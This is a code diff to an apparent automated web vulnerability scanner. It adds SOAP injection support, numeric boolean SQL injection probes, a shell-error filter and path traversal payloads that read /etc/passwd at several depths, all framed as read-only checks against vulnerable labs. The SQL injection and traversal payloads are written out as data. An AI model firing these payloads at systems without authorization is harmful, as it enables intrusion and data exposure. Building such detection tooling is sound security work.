@@ -1,5 +1,5 @@
 import type { Severity } from "../events/types.js";
-import type { GraphQLProbe } from "../recon/index.js";
+import type { GraphQLProbe, SoapProbe } from "../recon/index.js";
 import type { Session, SessionRequest, SessionResponse } from "../session/index.js";
 import { type Artifact, type AttackContext, latestArtifact, type SeedStep } from "./context.js";
 
@@ -39,6 +39,8 @@ export interface AttemptOpts {
   formData?: Record<string, string>;
   /** A GraphQL Query-field argument to inject into, when this is a GraphQL endpoint. */
   graphql?: GraphQLProbe;
+  /** A SOAP operation parameter to inject into, when this is a SOAP/WSDL endpoint. */
+  soap?: SoapProbe;
   /** The session carries operator-provided credentials (an authenticated run).
    *  Reaching an authorized resource is then expected, not broken access. */
   authenticated?: boolean;
@@ -371,12 +373,22 @@ async function send(session: Session, req: SessionRequest, label?: string): Prom
   return terminal ? { kind: "result", result: terminal } : sent;
 }
 
-/** Append a query parameter without clobbering an existing query string. */
+/**
+ * Append a query parameter without clobbering an existing query string.
+ *
+ * `URLSearchParams` encodes a space as `+`. A form-decoding stack (PHP, Express)
+ * turns `+` back into a space, but an app with a RAW query parser (Python's
+ * `http.server`, as in DSVW) does not — so a space-bearing payload like
+ * `' OR '1'='1` arrives as `'+OR+'1'='1` and the injection misfires. `%20` is
+ * decoded to a space by every parser, and form stacks accept it identically, so
+ * we emit `%20` for spaces in the serialized query — transparent to every lab
+ * already validated, correct on the raw-query ones too. (See COLD_RUN.md, DSVW.)
+ */
 function withParam(url: string, key: string, value: string): string {
   try {
     const u = new URL(url);
     u.searchParams.set(key, value);
-    return u.toString();
+    return `${u.origin}${u.pathname}${u.search.replace(/\+/g, "%20")}${u.hash}`;
   } catch {
     const sep = url.includes("?") ? "&" : "?";
     return `${url}${sep}${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
@@ -467,6 +479,16 @@ function surfaceFor(url: string, path: string): string {
 const SQL_ERROR =
   /error in your (?:sql|mysql) syntax|warning:\s*(?:mysqli?|pg|oci8?|sqlsrv|sqlite)_|mysqli?_(?:fetch|num_rows|query)|supplied argument is not a valid mysql|unterminated quoted string|quoted string not properly terminated|unclosed quotation mark|ORA-\d{3,}|SQLSTATE\[|SQLITE_ERROR|(?:sqlite3?|sqlalchemy|psycopg2?)[.\w]*error|\b(?:operational|programming|integrity)error\b|org\.postgresql|org\.h2\.|com\.mysql|psql:|unrecognized token|no such column|near ["']|syntax error at or near|incorrect syntax near/i;
 
+// A POSIX shell's own parse error on an unbalanced quote — `/bin/sh: 1: Syntax
+// error: Unterminated quoted string` — shares the phrase "unterminated quoted
+// string" with SQL_ERROR above. At an OS-command-injection sink (a `dig`/`nslookup`
+// shell-out), the error-based SQLi quote probe therefore trips SQL_ERROR on a shell
+// message, mislabelling the command-injection sink as error-based SQLi. The shell
+// prefix (`/bin/sh:`, `sh: <n>:`, `command not found`) is text no database driver
+// emits, so its presence rules the error shell-caused and the SQLi signal is withheld.
+const SHELL_ERROR =
+  /\/bin\/(?:sh|bash|dash|zsh):|(?:^|[\s>])(?:ba|da|z)?sh: \d+: |: command not found|cannot execute binary file/im;
+
 // A framework/version banner leaked on an error page — e.g. Juice Shop's 500
 // page titled "OWASP Juice Shop (Express ^4.22.1)". The parenthetical names the
 // server framework and its version: a fresh fingerprint the quiet surface never
@@ -495,11 +517,36 @@ function bannerArtifact(snippet: string, from: string): Artifact | undefined {
 const SQLI_TAUTOLOGY = "' OR '1'='1";
 const SQLI_FALSE = "' AND '1'='2";
 
+// The same oracle for a NUMERIC (unquoted) context — `WHERE id=<value>`, where a
+// quoted payload only yields a parse error. Always-true `0 OR 1=1` matches every
+// row; always-false `0 AND 1=1` matches none. In a string context these land as
+// literal text (identical results) or error both (no differential), so the pair
+// confirms only a genuine numeric injection. SELECT-side, read-only.
+//
+// Spaces are written as SQL inline comments `/**/` (whitespace to every engine)
+// rather than literal spaces: a GET value's spaces serialize to `+`, and an app
+// with a raw query parser (Python's http.server, as in DSVW) does NOT decode `+`
+// back to a space, so `0+OR+1=1` is invalid SQL and the oracle silently misfired.
+// `/**/` carries no space to encode, so the payload survives either parser.
+const SQLI_NUM_TRUE = "0/**/OR/**/1=1";
+const SQLI_NUM_FALSE = "0/**/AND/**/1=1";
+
+/** Escape a value for an XML text node, so a SOAP envelope stays well-formed. */
+function xmlEscape(value: string): string {
+  return value
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&apos;");
+}
+
 /**
  * A proxy for "how many records did this query return" — HTML table rows, or, for
- * a JSON response, record objects. Static page chrome (CSS/JS braces) is NOT
- * counted: JSON objects are tallied only when the body is actually JSON, so a
- * boolean oracle compares data rows, not a page's styling.
+ * a JSON response, record objects, or, for a SOAP response, the repeated leaf
+ * result elements a service returns for an array. Static page chrome (CSS/JS
+ * braces) is NOT counted: JSON objects are tallied only when the body is actually
+ * JSON, so a boolean oracle compares data rows, not a page's styling.
  */
 function resultShape(body: string): number {
   const rows = (body.match(/<tr\b/gi) ?? []).length;
@@ -507,7 +554,14 @@ function resultShape(body: string): number {
   const trimmed = body.trimStart();
   const isJson = trimmed.startsWith("[") || trimmed.startsWith("{");
   const jsonObjs = isJson ? (body.match(/\{[^{}]*"[^{}]*\}/g) ?? []).length : 0;
-  return Math.max(rows, Math.floor(cells / 2), jsonObjs);
+  // A SOAP array response wraps each record in a repeated leaf element
+  // (`<tns:string>alice</tns:string>`). Count non-empty leaf text elements — the
+  // operation/result wrappers hold child elements, not text, so they are not
+  // counted, and an empty result set yields zero. Gated on a SOAP envelope so an
+  // ordinary HTML body with a stray `<b>x</b>` never trips this branch.
+  const isSoap = /<(?:\w+:)?Envelope[\s>]/i.test(body);
+  const soapLeaves = isSoap ? (body.match(/<([\w:]+)>[^<]+<\/\1>/g) ?? []).length : 0;
+  return Math.max(rows, Math.floor(cells / 2), jsonObjs, soapLeaves);
 }
 
 /**
@@ -537,6 +591,35 @@ function injectionRequest(
         body: JSON.stringify({ query }),
       },
       label: `POST ${opts.url}  graphql ${g.field}(${g.arg})`,
+    };
+  }
+  // A SOAP operation parameter: build a SOAP 1.1 envelope calling `<operation>`
+  // with the payload at the target `<param>` and every sibling parameter at a
+  // benign default, so the call stays valid. The payload is XML-escaped — the
+  // server's XML parser decodes it back before the handler builds its query, so a
+  // metacharacter still reaches the sink while the envelope stays well-formed.
+  // Always a POST of a read-like operation (recon's allow-list) — read semantics.
+  if (opts.soap) {
+    const s = opts.soap;
+    const el = (name: string, v: string) => `<tns:${name}>${xmlEscape(v)}</tns:${name}>`;
+    const params = [
+      ...s.fixedParams.filter((p) => p.name !== s.param).map((p) => el(p.name, p.value)),
+      el(s.param, value),
+    ].join("");
+    const body =
+      `<?xml version="1.0" encoding="UTF-8"?>` +
+      `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" ` +
+      `xmlns:tns="${s.namespace}"><soapenv:Body>` +
+      `<tns:${s.operation}>${params}</tns:${s.operation}>` +
+      `</soapenv:Body></soapenv:Envelope>`;
+    return {
+      req: {
+        url: opts.url,
+        method: "POST",
+        headers: { "content-type": "text/xml; charset=utf-8", soapaction: `"${s.soapAction}"` },
+        body,
+      },
+      label: `POST ${opts.url}  soap ${s.operation}(${s.param})`,
     };
   }
   // An OpenAPI path parameter ({username}) is injected by substituting the payload
@@ -622,6 +705,7 @@ function isMutatingSurface(opts: AttemptOpts): boolean {
 // conventional key on the search surface (the first target's shape).
 function candidateFields(opts: AttemptOpts): Array<string | undefined> {
   if (opts.graphql) return [`${opts.graphql.field}.${opts.graphql.arg}`];
+  if (opts.soap) return [`${opts.soap.operation}.${opts.soap.param}`];
   const fields = opts.fields ?? [];
   if (opts.method === "POST") return fields.length > 0 ? fields.slice(0, 3) : [undefined];
   const out: Array<string | undefined> = [...fields];
@@ -698,6 +782,7 @@ async function sqlInjectionCheck(
 
     if (
       SQL_ERROR.test(scan) &&
+      !SHELL_ERROR.test(scan) &&
       (await signalIsPayloadCaused(session, opts, field, benignControlValue(), SQL_ERROR))
     ) {
       const banner = bannerArtifact(scan, technique);
@@ -738,6 +823,40 @@ async function sqlInjectionCheck(
             note: `always-false → ${falseRows} record-rows; always-true → ${trueRows}`,
           },
           status: trueRes.res.status,
+        };
+      }
+    }
+
+    // 2b) Boolean-based in a NUMERIC context: the sink concatenates the value
+    //     without quotes (`WHERE id=<value>`), so the quoted probes above only
+    //     provoke a parse error — and that error appears under a benign value too
+    //     (an unquoted `nf…` is itself an invalid column reference), so the
+    //     error-based control differential correctly suppresses it. Two unquoted
+    //     boolean payloads — always-true `0 OR 1=1` (every row) and always-false
+    //     `0 AND 1=1` (no row) — return different result sets when the value lands
+    //     in a numeric predicate, and identical ones (literal strings, or both
+    //     erroring) when it does not, so this never confirms outside a real
+    //     numeric injection. SELECT-side only — it reads rows, it writes nothing.
+    const numFalse = injectionRequest(opts, field, SQLI_NUM_FALSE);
+    const numTrue = injectionRequest(opts, field, SQLI_NUM_TRUE);
+    const numFalseRes = await rawSend(session, numFalse.req);
+    const numTrueRes = await rawSend(session, numTrue.req, numTrue.label);
+    if (numFalseRes.kind === "ok" && numTrueRes.kind === "ok") {
+      const numFalseRows = resultShape(numFalseRes.res.body);
+      const numTrueRows = resultShape(numTrueRes.res.body);
+      if (numTrueRows > numFalseRows && numTrueRows >= 1) {
+        return {
+          ok: true,
+          note: `${technique}: always-true numeric condition returned ${numTrueRows} record(s) vs ${numFalseRows} for always-false on '${field ?? "q"}' — boolean-based SQLi (numeric context)`,
+          applicable: true,
+          basis:
+            "Impact-confirmed: two requests differing only in an unquoted boolean (0 OR 1=1 vs 0 AND 1=1) returned different result sets, so the injected logic altered a numeric-context query and read rows unauthorized. The probe injects SELECT-side logic only — it reads, it writes nothing.",
+          evidence: {
+            request: numTrue.label,
+            response: numTrueRes.snippet,
+            note: `always-false → ${numFalseRows} record-rows; always-true → ${numTrueRows}`,
+          },
+          status: numTrueRes.res.status,
         };
       }
     }
@@ -837,10 +956,26 @@ async function csrfCheck(
 const TRAVERSAL_HIT =
   /root:[x*]?:0:0:|\[boot loader\]|\[fonts\]|; for 16-bit app support|daemon:.*:\/usr\/sbin/i;
 
+// A vulnerable include reads the same host file whether it takes an ABSOLUTE path
+// (`?file=/etc/passwd`, as XVWA does) or needs enough `../` to climb out of a
+// deeply-nested endpoint directory (`/var/www/html/app/vulnerabilities/fi/` is
+// six levels below `/`). A single fixed depth silently misses both: a 4-dot probe
+// never leaves a six-deep directory, so a real flaw reads as a clean negative.
+// Probe the absolute path plus a range of depths — excess `../` collapses at the
+// root, so an over-deep sequence is harmless. Every payload names the same benign,
+// world-readable file: read-only, writes nothing.
+const TRAVERSAL_PAYLOADS = [
+  "/etc/passwd",
+  "../../../etc/passwd",
+  "../../../../../etc/passwd",
+  "../../../../../../../etc/passwd",
+  "../../../../../../../../../../etc/passwd",
+];
+
 /**
  * Path traversal / file inclusion — non-destructive read: ask for a file above
- * the web root via a dot-dot sequence and confirm host-file contents leak. It
- * only reads; it writes nothing.
+ * the web root via an absolute path or a dot-dot sequence and confirm host-file
+ * contents leak. It only reads; it writes nothing.
  */
 async function pathTraversalCheck(
   session: Session,
@@ -850,37 +985,39 @@ async function pathTraversalCheck(
   if (isMutatingSurface(opts)) return mutatingSkip(technique);
   let last: AttemptResult | undefined;
   for (const field of candidateFields(opts)) {
-    const { req, label } = injectionRequest(opts, field, "../../../../etc/passwd", "file");
-    const sent = await send(session, req, label);
-    if (sent.kind === "result") {
-      last = sent.result;
-      continue;
-    }
-    const { scan, base } = sent;
-    if (
-      TRAVERSAL_HIT.test(scan) &&
-      (await signalIsPayloadCaused(
-        session,
-        opts,
-        field,
-        benignControlValue(),
-        TRAVERSAL_HIT,
-        "file",
-      ))
-    ) {
-      return {
-        ok: true,
-        note: `${technique}: host file contents leaked via '${field ?? "file"}' dot-dot sequence and absent from a benign control (path-traversal signal)`,
+    for (const payload of TRAVERSAL_PAYLOADS) {
+      const { req, label } = injectionRequest(opts, field, payload, "file");
+      const sent = await send(session, req, label);
+      if (sent.kind === "result") {
+        last = sent.result;
+        break; // a hard status (404/405/5xx) is a property of the field, not the depth
+      }
+      const { scan, base } = sent;
+      if (
+        TRAVERSAL_HIT.test(scan) &&
+        (await signalIsPayloadCaused(
+          session,
+          opts,
+          field,
+          benignControlValue(),
+          TRAVERSAL_HIT,
+          "file",
+        ))
+      ) {
+        return {
+          ok: true,
+          note: `${technique}: host file contents leaked via '${field ?? "file"}' (${payload}) and absent from a benign control (path-traversal signal)`,
+          applicable: true,
+          ...base,
+        };
+      }
+      last = {
+        ok: false,
+        note: `${technique}: no file contents leaked`,
         applicable: true,
         ...base,
       };
     }
-    last = {
-      ok: false,
-      note: `${technique}: no file contents leaked`,
-      applicable: true,
-      ...base,
-    };
   }
   return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
 }
